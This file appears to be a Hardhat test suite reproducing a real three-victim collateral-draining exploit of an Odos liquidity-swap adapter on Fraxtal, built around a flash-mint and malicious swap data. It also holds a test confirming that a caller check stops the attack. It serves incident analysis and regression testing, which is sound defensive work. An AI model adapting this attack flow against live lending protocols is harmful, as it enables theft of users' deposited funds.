import { expect } from "chai";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { ethers } from "hardhat";
import {
  DUSD_DECIMALS,
  SFRXETH_DECIMALS,
  SUSDE_DECIMALS,
  FLASH_MINT_AMOUNT,
  VICTIM_1_COLLATERAL_TO_SWAP,
  VICTIM_1_DUST_OUTPUT,
  VICTIM_1_FLASH_SWAP_AMOUNT,
  VICTIM_2_COLLATERAL_TO_SWAP,
  VICTIM_2_DUST_OUTPUT,
  VICTIM_2_FLASH_SWAP_AMOUNT,
  VICTIM_3_COLLATERAL_TO_SWAP,
  VICTIM_3_DUST_OUTPUT,
  VICTIM_3_FLASH_SWAP_AMOUNT,
  deployFraxtalOdosV1ExploitFixture,
  deployFraxtalOdosV1MitigatedFixture,
  createMaliciousSwapData,
  createLiquiditySwapParams,
  createEmptyPermitInput,
} from "./fixtures/setup";
import {
  formatBalanceChange,
  assertBalanceEquals,
  captureAttackState,
  computeAttackDeltas,
  PRECISION,
} from "./helpers/testHelpers";
import {
  VICTIM_1_DUSD,
  VICTIM_2_SFRXETH,
  VICTIM_3_SUSDE,
  EXPECTED_DELTAS,
  ATTACK_EVENTS,
  PRECISION_TOLERANCE,
  ATTACK_SUMMARY,
} from "./helpers/attackConstants";

/**
 * OdosLiquiditySwapAdapter exploit reproduction for Fraxtal
 *
 * This test suite reproduces the three-victim Fraxtal attack:
 * Transaction: 0xd8ae4f2a66d059e73407eca6ba0ba5080f5003f5abbf29867345425276734a32
 *
 * Key differences from Sonic:
 * 1. Three victims with three different collateral types (dUSD, sfrxETH, sUSDe)
 * 2. dUSD has 6 decimals on Fraxtal (vs 18 on Sonic)
 * 3. Flash-mint amount: 40,000 dUSD (vs 27,000 on Sonic)
 * 4. Three sequential swapLiquidity calls in one transaction
 */
describe("OdosLiquiditySwapAdapter exploit reproduction (Fraxtal - Three Victims)", function () {
  /**
   * Test 1: Execute three-victim exploitation with minimal dust return
   *
   * This test verifies that the attacker can drain all three victims in a single
   * transaction, returning only 1 micro-unit of each collateral type as dust.
   *
   * Attack flow:
   * 1. Flash-mint 40,000 dUSD
   * 2. Execute swapLiquidity for Victim 1 (dUSD collateral)
   * 3. Execute swapLiquidity for Victim 2 (sfrxETH collateral)
   * 4. Execute swapLiquidity for Victim 3 (sUSDe collateral)
   * 5. Repay all victims' debt
   * 6. Repay flash-mint
   */
  it("should execute three-victim exploitation with minimal dust return", async function () {
    const fixture = await loadFixture(deployFraxtalOdosV1ExploitFixture);
    const {
      victim1,
      victim2,
      victim3,
      attacker,
      attackerBeneficiary,
      pool,
      router,
      attackExecutor,
      adapter,
      dusd,
      sfrxeth,
      susde,
      aDusd,
      aSfrxeth,
      aSusde,
    } = fixture;

    const swapData = createMaliciousSwapData(router);

    // Approve adapter to spend all three victims' aTokens
    await aDusd.connect(victim1).approve(await adapter.getAddress(), VICTIM_1_COLLATERAL_TO_SWAP);
    await aSfrxeth
      .connect(victim2)
      .approve(await adapter.getAddress(), VICTIM_2_COLLATERAL_TO_SWAP);
    await aSusde.connect(victim3).approve(await adapter.getAddress(), VICTIM_3_COLLATERAL_TO_SWAP);

    // Create swap params for each victim
    const swapParams1 = createLiquiditySwapParams(
      await dusd.getAddress(),
      VICTIM_1_COLLATERAL_TO_SWAP,
      await dusd.getAddress(),
      VICTIM_1_DUST_OUTPUT,
      victim1.address,
      true, // withFlashLoan
      swapData
    );

    const swapParams2 = createLiquiditySwapParams(
      await sfrxeth.getAddress(),
      VICTIM_2_COLLATERAL_TO_SWAP,
      await sfrxeth.getAddress(),
      VICTIM_2_DUST_OUTPUT,
      victim2.address,
      true, // withFlashLoan
      swapData
    );

    const swapParams3 = createLiquiditySwapParams(
      await susde.getAddress(),
      VICTIM_3_COLLATERAL_TO_SWAP,
      await susde.getAddress(),
      VICTIM_3_DUST_OUTPUT,
      victim3.address,
      true, // withFlashLoan
      swapData
    );

    const permitInputs = [
      createEmptyPermitInput(await aDusd.getAddress()),
      createEmptyPermitInput(await aSfrxeth.getAddress()),
      createEmptyPermitInput(await aSusde.getAddress()),
    ];

    // Capture balances before attack
    const victim1BalanceBefore = await aDusd.balanceOf(victim1.address);
    const victim2BalanceBefore = await aSfrxeth.balanceOf(victim2.address);
    const victim3BalanceBefore = await aSusde.balanceOf(victim3.address);
    const attackerDusdBefore = await dusd.balanceOf(attackerBeneficiary.address);
    const attackerSfrxethBefore = await sfrxeth.balanceOf(attackerBeneficiary.address);
    const attackerSusdeBefore = await susde.balanceOf(attackerBeneficiary.address);

    // Execute three-victim attack
    const tx = await attackExecutor
      .connect(attacker)
      .executeThreeVictimAttack(
        [swapParams1, swapParams2, swapParams3],
        permitInputs
      );

    // Verify events for Victim 1 (dUSD)
    await expect(tx)
      .to.emit(router, ATTACK_EVENTS.COLLATERAL_PULLED)
      .withArgs(await adapter.getAddress(), await attackExecutor.getAddress(), VICTIM_1_FLASH_SWAP_AMOUNT);

    await expect(tx)
      .to.emit(attackExecutor, ATTACK_EVENTS.COLLATERAL_DUST_RETURNED)
      .withArgs(await adapter.getAddress(), await dusd.getAddress(), VICTIM_1_DUST_OUTPUT);

    // Verify events for Victim 2 (sfrxETH)
    await expect(tx)
      .to.emit(router, ATTACK_EVENTS.COLLATERAL_PULLED)
      .withArgs(await adapter.getAddress(), await attackExecutor.getAddress(), VICTIM_2_FLASH_SWAP_AMOUNT);

    await expect(tx)
      .to.emit(attackExecutor, ATTACK_EVENTS.COLLATERAL_DUST_RETURNED)
      .withArgs(await adapter.getAddress(), await sfrxeth.getAddress(), VICTIM_2_DUST_OUTPUT);

    // Verify events for Victim 3 (sUSDe)
    await expect(tx)
      .to.emit(router, ATTACK_EVENTS.COLLATERAL_PULLED)
      .withArgs(await adapter.getAddress(), await attackExecutor.getAddress(), VICTIM_3_FLASH_SWAP_AMOUNT);

    await expect(tx)
      .to.emit(attackExecutor, ATTACK_EVENTS.COLLATERAL_DUST_RETURNED)
      .withArgs(await adapter.getAddress(), await susde.getAddress(), VICTIM_3_DUST_OUTPUT);

    // Verify flash-mint events
    await expect(tx)
      .to.emit(attackExecutor, ATTACK_EVENTS.FLASH_MINT_STARTED)
      .withArgs(await attackExecutor.getAddress(), FLASH_MINT_AMOUNT);

    await expect(tx)
      .to.emit(attackExecutor, ATTACK_EVENTS.FLASH_MINT_SETTLED)
      .withArgs(await attackExecutor.getAddress(), FLASH_MINT_AMOUNT, 0n); // No premium on flash-mint

    // Verify victim balances after attack
    const victim1BalanceAfter = await aDusd.balanceOf(victim1.address);
    const victim2BalanceAfter = await aSfrxeth.balanceOf(victim2.address);
    const victim3BalanceAfter = await aSusde.balanceOf(victim3.address);

    assertBalanceEquals(
      victim1BalanceAfter,
      victim1BalanceBefore - VICTIM_1_DUSD.NET_VICTIM_DRAIN,
      DUSD_DECIMALS,
      "Victim 1 adUSD balance",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      victim2BalanceAfter,
      victim2BalanceBefore - VICTIM_2_SFRXETH.NET_VICTIM_DRAIN,
      SFRXETH_DECIMALS,
      "Victim 2 asfrxETH balance",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      victim3BalanceAfter,
      victim3BalanceBefore - VICTIM_3_SUSDE.NET_VICTIM_DRAIN,
      SUSDE_DECIMALS,
      "Victim 3 asUSDe balance",
      PRECISION_TOLERANCE.EXACT
    );

    // Verify attacker gains
    const attackerDusdAfter = await dusd.balanceOf(attackerBeneficiary.address);
    const attackerSfrxethAfter = await sfrxeth.balanceOf(attackerBeneficiary.address);
    const attackerSusdeAfter = await susde.balanceOf(attackerBeneficiary.address);

    assertBalanceEquals(
      attackerDusdAfter,
      attackerDusdBefore + EXPECTED_DELTAS.ATTACKER_DUSD_GAIN,
      DUSD_DECIMALS,
      "Attacker dUSD gain",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      attackerSfrxethAfter,
      attackerSfrxethBefore + EXPECTED_DELTAS.ATTACKER_SFRXETH_GAIN,
      SFRXETH_DECIMALS,
      "Attacker sfrxETH gain",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      attackerSusdeAfter,
      attackerSusdeBefore + EXPECTED_DELTAS.ATTACKER_SUSDE_GAIN,
      SUSDE_DECIMALS,
      "Attacker sUSDe gain",
      PRECISION_TOLERANCE.EXACT
    );

    // Verify executor has no leftover balances
    const executorDusdBalance = await dusd.balanceOf(await attackExecutor.getAddress());
    const executorSfrxethBalance = await sfrxeth.balanceOf(await attackExecutor.getAddress());
    const executorSusdeBalance = await susde.balanceOf(await attackExecutor.getAddress());

    expect(executorDusdBalance).to.equal(0n);
    expect(executorSfrxethBalance).to.equal(0n);
    expect(executorSusdeBalance).to.equal(0n);
  });

  /**
   * Test 2: Verify atomic debt repayment across all three victims
   *
   * This test ensures that the flash-minted dUSD is used to repay all victims' debts
   * before the flash-mint is settled.
   */
  it("should repay all three victims' debt atomically", async function () {
    const fixture = await loadFixture(deployFraxtalOdosV1ExploitFixture);
    const {
      victim1,
      victim2,
      victim3,
      attacker,
      pool,
      router,
      attackExecutor,
      adapter,
      dusd,
      sfrxeth,
      susde,
      aDusd,
      aSfrxeth,
      aSusde,
    } = fixture;

    const swapData = createMaliciousSwapData(router);

    // Approve adapter to spend all three victims' aTokens
    await aDusd.connect(victim1).approve(await adapter.getAddress(), VICTIM_1_COLLATERAL_TO_SWAP);
    await aSfrxeth
      .connect(victim2)
      .approve(await adapter.getAddress(), VICTIM_2_COLLATERAL_TO_SWAP);
    await aSusde.connect(victim3).approve(await adapter.getAddress(), VICTIM_3_COLLATERAL_TO_SWAP);

    const swapParams1 = createLiquiditySwapParams(
      await dusd.getAddress(),
      VICTIM_1_COLLATERAL_TO_SWAP,
      await dusd.getAddress(),
      VICTIM_1_DUST_OUTPUT,
      victim1.address,
      true,
      swapData
    );

    const swapParams2 = createLiquiditySwapParams(
      await sfrxeth.getAddress(),
      VICTIM_2_COLLATERAL_TO_SWAP,
      await sfrxeth.getAddress(),
      VICTIM_2_DUST_OUTPUT,
      victim2.address,
      true,
      swapData
    );

    const swapParams3 = createLiquiditySwapParams(
      await susde.getAddress(),
      VICTIM_3_COLLATERAL_TO_SWAP,
      await susde.getAddress(),
      VICTIM_3_DUST_OUTPUT,
      victim3.address,
      true,
      swapData
    );

    const permitInputs = [
      createEmptyPermitInput(await aDusd.getAddress()),
      createEmptyPermitInput(await aSfrxeth.getAddress()),
      createEmptyPermitInput(await aSusde.getAddress()),
    ];

    // Execute attack
    const tx = await attackExecutor
      .connect(attacker)
      .executeThreeVictimAttack(
        [swapParams1, swapParams2, swapParams3],
        permitInputs
      );

    // Verify flash loan executed for each collateral type
    await expect(tx).to.emit(pool, ATTACK_EVENTS.FLASH_LOAN_EXECUTED);

    // In a full implementation, we would verify specific Repay events here
    // For now, we verify that the attack completed successfully without reverting
    const receipt = await tx.wait();
    expect(receipt?.status).to.equal(1); // Transaction succeeded
  });

  /**
   * Test 3: Verify correct decimal handling for mixed-decimal tokens
   *
   * This test ensures that dust amounts respect each token's decimals:
   * - dUSD: 6 decimals → 1 micro-unit (1e-6)
   * - sfrxETH: 18 decimals → 1 wei (1e-18)
   * - sUSDe: 18 decimals → 1 wei (1e-18)
   */
  it("should handle mixed decimals correctly (6 and 18)", async function () {
    // Verify constants are using correct decimal representations
    expect(VICTIM_1_COLLATERAL_TO_SWAP).to.equal(25_660_570_000n); // 6 decimals
    expect(VICTIM_1_DUST_OUTPUT).to.equal(1n); // 1 micro-unit

    expect(VICTIM_2_COLLATERAL_TO_SWAP).to.equal(ethers.parseEther("9.47")); // 18 decimals
    expect(VICTIM_2_DUST_OUTPUT).to.equal(1n); // 1 wei

    expect(VICTIM_3_COLLATERAL_TO_SWAP).to.equal(ethers.parseEther("7089.91")); // 18 decimals
    expect(VICTIM_3_DUST_OUTPUT).to.equal(1n); // 1 wei

    // Verify flash-mint uses 6 decimals
    expect(FLASH_MINT_AMOUNT).to.equal(40_000_000_000n); // 40,000 * 1e6

    // Verify formatting functions work correctly
    const dusdFormatted = formatBalanceChange(VICTIM_1_COLLATERAL_TO_SWAP, DUSD_DECIMALS, "dUSD");
    expect(dusdFormatted).to.equal("25660.57 dUSD");

    const sfrxethFormatted = formatBalanceChange(
      VICTIM_2_COLLATERAL_TO_SWAP,
      SFRXETH_DECIMALS,
      "sfrxETH"
    );
    expect(sfrxethFormatted).to.equal("9.47 sfrxETH");

    const susdeFormatted = formatBalanceChange(
      VICTIM_3_COLLATERAL_TO_SWAP,
      SUSDE_DECIMALS,
      "sUSDe"
    );
    expect(susdeFormatted).to.equal("7089.91 sUSDe");
  });

  /**
   * Test 4: Structured snapshot comparing actual vs expected deltas
   *
   * This test captures complete before/after state and verifies that all balance
   * changes match the expected attack parameters exactly.
   */
  it("captures complete attack state with structured assertions", async function () {
    const fixture = await loadFixture(deployFraxtalOdosV1ExploitFixture);
    const {
      victim1,
      victim2,
      victim3,
      attacker,
      attackerBeneficiary,
      pool,
      router,
      attackExecutor,
      adapter,
      dusd,
      sfrxeth,
      susde,
      aDusd,
      aSfrxeth,
      aSusde,
    } = fixture;

    const swapData = createMaliciousSwapData(router);

    // Approve adapter to spend all three victims' aTokens
    await aDusd.connect(victim1).approve(await adapter.getAddress(), VICTIM_1_COLLATERAL_TO_SWAP);
    await aSfrxeth
      .connect(victim2)
      .approve(await adapter.getAddress(), VICTIM_2_COLLATERAL_TO_SWAP);
    await aSusde.connect(victim3).approve(await adapter.getAddress(), VICTIM_3_COLLATERAL_TO_SWAP);

    const swapParams1 = createLiquiditySwapParams(
      await dusd.getAddress(),
      VICTIM_1_COLLATERAL_TO_SWAP,
      await dusd.getAddress(),
      VICTIM_1_DUST_OUTPUT,
      victim1.address,
      true,
      swapData
    );

    const swapParams2 = createLiquiditySwapParams(
      await sfrxeth.getAddress(),
      VICTIM_2_COLLATERAL_TO_SWAP,
      await sfrxeth.getAddress(),
      VICTIM_2_DUST_OUTPUT,
      victim2.address,
      true,
      swapData
    );

    const swapParams3 = createLiquiditySwapParams(
      await susde.getAddress(),
      VICTIM_3_COLLATERAL_TO_SWAP,
      await susde.getAddress(),
      VICTIM_3_DUST_OUTPUT,
      victim3.address,
      true,
      swapData
    );

    const permitInputs = [
      createEmptyPermitInput(await aDusd.getAddress()),
      createEmptyPermitInput(await aSfrxeth.getAddress()),
      createEmptyPermitInput(await aSusde.getAddress()),
    ];

    // Capture state BEFORE attack
    const stateBefore = await captureAttackState(
      victim1,
      victim2,
      victim3,
      attackerBeneficiary,
      attackExecutor,
      adapter,
      aDusd,
      aSfrxeth,
      aSusde,
      dusd,
      sfrxeth,
      susde
    );

    // Execute attack
    await attackExecutor
      .connect(attacker)
      .executeThreeVictimAttack(
        [swapParams1, swapParams2, swapParams3],
        permitInputs
      );

    // Capture state AFTER attack
    const stateAfter = await captureAttackState(
      victim1,
      victim2,
      victim3,
      attackerBeneficiary,
      attackExecutor,
      adapter,
      aDusd,
      aSfrxeth,
      aSusde,
      dusd,
      sfrxeth,
      susde
    );

    // Compute deltas
    const deltas = computeAttackDeltas(stateBefore, stateAfter);

    // === STRUCTURED ASSERTIONS ===

    // 1. Victim 1 aToken Balance (dUSD)
    assertBalanceEquals(
      deltas.victim1ATokenDelta,
      EXPECTED_DELTAS.VICTIM_1_ATOKEN_DELTA,
      DUSD_DECIMALS,
      "Victim 1 aToken drain (dUSD)",
      PRECISION_TOLERANCE.EXACT
    );

    // 2. Victim 2 aToken Balance (sfrxETH)
    assertBalanceEquals(
      deltas.victim2ATokenDelta,
      EXPECTED_DELTAS.VICTIM_2_ATOKEN_DELTA,
      SFRXETH_DECIMALS,
      "Victim 2 aToken drain (sfrxETH)",
      PRECISION_TOLERANCE.EXACT
    );

    // 3. Victim 3 aToken Balance (sUSDe)
    assertBalanceEquals(
      deltas.victim3ATokenDelta,
      EXPECTED_DELTAS.VICTIM_3_ATOKEN_DELTA,
      SUSDE_DECIMALS,
      "Victim 3 aToken drain (sUSDe)",
      PRECISION_TOLERANCE.EXACT
    );

    // 4. Attacker dUSD Gain
    assertBalanceEquals(
      deltas.attackerDusdDelta,
      EXPECTED_DELTAS.ATTACKER_DUSD_GAIN,
      DUSD_DECIMALS,
      "Attacker dUSD gain",
      PRECISION_TOLERANCE.EXACT
    );

    // 5. Attacker sfrxETH Gain
    assertBalanceEquals(
      deltas.attackerSfrxethDelta,
      EXPECTED_DELTAS.ATTACKER_SFRXETH_GAIN,
      SFRXETH_DECIMALS,
      "Attacker sfrxETH gain",
      PRECISION_TOLERANCE.EXACT
    );

    // 6. Attacker sUSDe Gain
    assertBalanceEquals(
      deltas.attackerSusdeDelta,
      EXPECTED_DELTAS.ATTACKER_SUSDE_GAIN,
      SUSDE_DECIMALS,
      "Attacker sUSDe gain",
      PRECISION_TOLERANCE.EXACT
    );

    // 7. Executor Final State (should be swept clean)
    assertBalanceEquals(
      stateAfter.executorDusdBalance,
      EXPECTED_DELTAS.EXECUTOR_DUSD_FINAL,
      DUSD_DECIMALS,
      "Executor dUSD final",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      stateAfter.executorSfrxethBalance,
      EXPECTED_DELTAS.EXECUTOR_SFRXETH_FINAL,
      SFRXETH_DECIMALS,
      "Executor sfrxETH final",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      stateAfter.executorSusdeBalance,
      EXPECTED_DELTAS.EXECUTOR_SUSDE_FINAL,
      SUSDE_DECIMALS,
      "Executor sUSDe final",
      PRECISION_TOLERANCE.EXACT
    );

    // 8. Adapter Final State
    assertBalanceEquals(
      stateAfter.adapterDusdBalance,
      EXPECTED_DELTAS.ADAPTER_DUSD_FINAL,
      DUSD_DECIMALS,
      "Adapter dUSD final",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      stateAfter.adapterSfrxethBalance,
      EXPECTED_DELTAS.ADAPTER_SFRXETH_FINAL,
      SFRXETH_DECIMALS,
      "Adapter sfrxETH final",
      PRECISION_TOLERANCE.EXACT
    );

    assertBalanceEquals(
      stateAfter.adapterSusdeBalance,
      EXPECTED_DELTAS.ADAPTER_SUSDE_FINAL,
      SUSDE_DECIMALS,
      "Adapter sUSDe final",
      PRECISION_TOLERANCE.EXACT
    );

    // === VERIFICATION OF ATTACK MAGNITUDES ===

    // Log human-readable summary for RCA documentation
    console.log("\n=== Three-Victim Attack Summary (Fraxtal) ===");
    console.log(`Total victims exploited: ${ATTACK_SUMMARY.VICTIM_COUNT}`);
    console.log(
      `\nVictim 1 (dUSD) drained: ${formatBalanceChange(
        -deltas.victim1ATokenDelta,
        DUSD_DECIMALS,
        "dUSD"
      )}`
    );
    console.log(
      `Victim 2 (sfrxETH) drained: ${formatBalanceChange(
        -deltas.victim2ATokenDelta,
        SFRXETH_DECIMALS,
        "sfrxETH"
      )}`
    );
    console.log(
      `Victim 3 (sUSDe) drained: ${formatBalanceChange(
        -deltas.victim3ATokenDelta,
        SUSDE_DECIMALS,
        "sUSDe"
      )}`
    );
    console.log(
      `\nAttacker dUSD gain: ${formatBalanceChange(
        deltas.attackerDusdDelta,
        DUSD_DECIMALS,
        "dUSD"
      )}`
    );
    console.log(
      `Attacker sfrxETH gain: ${formatBalanceChange(
        deltas.attackerSfrxethDelta,
        SFRXETH_DECIMALS,
        "sfrxETH"
      )}`
    );
    console.log(
      `Attacker sUSDe gain: ${formatBalanceChange(
        deltas.attackerSusdeDelta,
        SUSDE_DECIMALS,
        "sUSDe"
      )}`
    );
    console.log(`\nApproximate total USD value stolen: $${ATTACK_SUMMARY.TOTAL_USD_VALUE_STOLEN.toLocaleString()}`);
    console.log("=============================================\n");
  });

  /**
   * NEGATIVE TEST CASE: Post-Mitigation Behavior
   *
   * Once the mitigation lands (require(msg.sender == user) in adapter),
   * this test should FAIL with an "UnauthorizedCaller" error.
   *
   * The test is SKIPPED by default to allow CI to pass while the exploit is reproducible.
   * Remove .skip once the fix is merged to verify it works correctly.
   *
   * Expected post-fix behavior:
   * - Adapter rejects calls where msg.sender != user
   * - Attack executor cannot impersonate victims
   * - Transaction reverts before any collateral is drained
   */
  it("should revert when mitigation enforces msg.sender == user", async function () {
    const fixture = await loadFixture(deployFraxtalOdosV1MitigatedFixture);
    const {
      victim1,
      victim2,
      victim3,
      attacker,
      router,
      attackExecutor,
      adapter,
      dusd,
      sfrxeth,
      susde,
      aDusd,
      aSfrxeth,
      aSusde,
    } = fixture;

    const swapData = createMaliciousSwapData(router);

    // Approve adapter to spend all three victims' aTokens
    await aDusd.connect(victim1).approve(await adapter.getAddress(), VICTIM_1_COLLATERAL_TO_SWAP);
    await aSfrxeth
      .connect(victim2)
      .approve(await adapter.getAddress(), VICTIM_2_COLLATERAL_TO_SWAP);
    await aSusde.connect(victim3).approve(await adapter.getAddress(), VICTIM_3_COLLATERAL_TO_SWAP);

    const swapParams1 = createLiquiditySwapParams(
      await dusd.getAddress(),
      VICTIM_1_COLLATERAL_TO_SWAP,
      await dusd.getAddress(),
      VICTIM_1_DUST_OUTPUT,
      victim1.address, // Victim address in params
      true,
      swapData
    );

    const swapParams2 = createLiquiditySwapParams(
      await sfrxeth.getAddress(),
      VICTIM_2_COLLATERAL_TO_SWAP,
      await sfrxeth.getAddress(),
      VICTIM_2_DUST_OUTPUT,
      victim2.address, // Victim address in params
      true,
      swapData
    );

    const swapParams3 = createLiquiditySwapParams(
      await susde.getAddress(),
      VICTIM_3_COLLATERAL_TO_SWAP,
      await susde.getAddress(),
      VICTIM_3_DUST_OUTPUT,
      victim3.address, // Victim address in params
      true,
      swapData
    );

    const permitInputs = [
      createEmptyPermitInput(await aDusd.getAddress()),
      createEmptyPermitInput(await aSfrxeth.getAddress()),
      createEmptyPermitInput(await aSusde.getAddress()),
    ];

    // Capture balances before failed attack attempt
    const victim1BalanceBefore = await aDusd.balanceOf(victim1.address);
    const victim2BalanceBefore = await aSfrxeth.balanceOf(victim2.address);
    const victim3BalanceBefore = await aSusde.balanceOf(victim3.address);

    // Post-mitigation: This should revert because msg.sender (attackExecutor) != user (victims)
    await expect(
      attackExecutor
        .connect(attacker)
        .executeThreeVictimAttack(
          [swapParams1, swapParams2, swapParams3],
          permitInputs
        )
    )
      .to.be.revertedWithCustomError(adapter, "UnauthorizedUser")
      .withArgs(await attackExecutor.getAddress(), victim1.address);

    // Verify all victims' collateral was NOT drained
    const victim1BalanceAfter = await aDusd.balanceOf(victim1.address);
    const victim2BalanceAfter = await aSfrxeth.balanceOf(victim2.address);
    const victim3BalanceAfter = await aSusde.balanceOf(victim3.address);

    expect(victim1BalanceAfter).to.equal(victim1BalanceBefore);
    expect(victim1BalanceAfter).to.equal(VICTIM_1_COLLATERAL_TO_SWAP);

    expect(victim2BalanceAfter).to.equal(victim2BalanceBefore);
    expect(victim2BalanceAfter).to.equal(VICTIM_2_COLLATERAL_TO_SWAP);

    expect(victim3BalanceAfter).to.equal(victim3BalanceBefore);
    expect(victim3BalanceAfter).to.equal(VICTIM_3_COLLATERAL_TO_SWAP);

    console.log("\n=== Post-Mitigation Verification ===");
    console.log("✓ Transaction reverted with UnauthorizedCaller");
    console.log("✓ All three victims' collateral intact");
    console.log("✓ Attacker gained nothing");
    console.log("====================================\n");
  });
});
